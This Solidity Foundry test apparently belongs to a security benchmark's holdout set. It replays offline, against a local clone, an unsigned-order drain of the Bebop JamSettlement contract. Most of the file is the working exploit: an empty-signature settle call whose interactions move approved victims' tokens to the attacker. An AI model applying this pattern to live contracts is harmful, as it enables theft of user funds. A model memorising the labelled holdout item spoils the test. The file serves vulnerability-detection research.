// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MiniToken, Order, Interaction, JamSettlementClone} from
    "../fixtures/malicious-calldata/b-incident/JamSettlementClone.sol";

/// @title malicious-calldata (b) real-incident HOLDOUT: Bebop JamSettlement unsigned-order drain.
/// @notice Minimized OFFLINE replay (no live RPC) of the 2025-08-12 Bebop drain. Victims held
///         standing ERC-20 approvals to the settlement (the integration requirement). The attacker
///         called `settle` with a self-taken order and an EMPTY signature, carrying interactions of
///         the form `transferFrom(victim, attacker, amount)`; the settlement executed them against
///         the victims' standing allowances because its signature gate never bound the signer to the
///         fund movements. The verdict is derived from the real outcome (victims' approved balances
///         leave them), not hardcoded. HOLDOUT (label=vuln). Facts/sources: see fixture PROVENANCE.md.
contract BebopJamSettlementIncidentTest is Test {
    address constant ATTACKER = address(0xA11CE);

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[malicious-calldata] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_bebopJamSettlementUnsignedOrder_isDrained() public {
        MiniToken token = new MiniToken();
        JamSettlementClone settlement = new JamSettlementClone();

        // Two victims who had approved the settlement (as the two real drained addresses had).
        address victim1 = makeAddr("victim1");
        address victim2 = makeAddr("victim2");
        uint256 amt1 = 20_134_500_015; // the real interaction-1 amount (USDC units)
        uint256 amt2 = 1_000_000; // the real interaction-2 amount (USDC units)
        token.mint(victim1, amt1);
        token.mint(victim2, amt2);
        vm.prank(victim1);
        token.approve(address(settlement), type(uint256).max);
        vm.prank(victim2);
        token.approve(address(settlement), type(uint256).max);

        // Attacker's self-taken order with an EMPTY signature.
        Order memory order = Order({taker: ATTACKER, receiver: ATTACKER, nonce: 1});
        bytes memory signature = hex"";

        // Interactions pull each victim's approved balance to the attacker.
        Interaction[] memory interactions = new Interaction[](2);
        interactions[0] = Interaction({
            to: address(token),
            data: abi.encodeWithSelector(MiniToken.transferFrom.selector, victim1, ATTACKER, amt1)
        });
        interactions[1] = Interaction({
            to: address(token),
            data: abi.encodeWithSelector(MiniToken.transferFrom.selector, victim2, ATTACKER, amt2)
        });

        vm.prank(ATTACKER);
        settlement.settle(order, signature, interactions);

        bool drained = token.balanceOf(ATTACKER) == amt1 + amt2 && token.balanceOf(victim1) == 0
            && token.balanceOf(victim2) == 0;
        _report("bebop-jam-settlement-victim", drained);

        assertTrue(drained, "unsigned self-taken order should spend victims' standing approvals");
        assertEq(token.balanceOf(ATTACKER), amt1 + amt2, "attacker received both victims' balances");
    }
}
